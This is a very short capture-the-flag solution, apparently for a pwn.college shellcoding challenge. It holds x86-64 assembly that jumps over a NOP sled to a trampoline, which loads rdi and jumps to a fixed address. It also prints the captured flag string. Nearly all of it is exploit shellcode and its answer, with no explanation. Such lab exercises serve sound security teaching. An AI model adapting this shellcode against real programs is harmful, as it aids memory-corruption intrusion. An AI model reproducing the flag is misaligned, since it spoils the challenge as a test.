## skrapt
```
jmp short trampoline

%rep 0x51
    nop
%endrep

trampoline:
    pop rdi
    mov rax, 0x403000
    jmp rax
```

## fag
```
pwn.college{IcEcDyBeWSFs9x7d8bP3WJc_JZN.dBTMywSMwEzNzEzW}
```
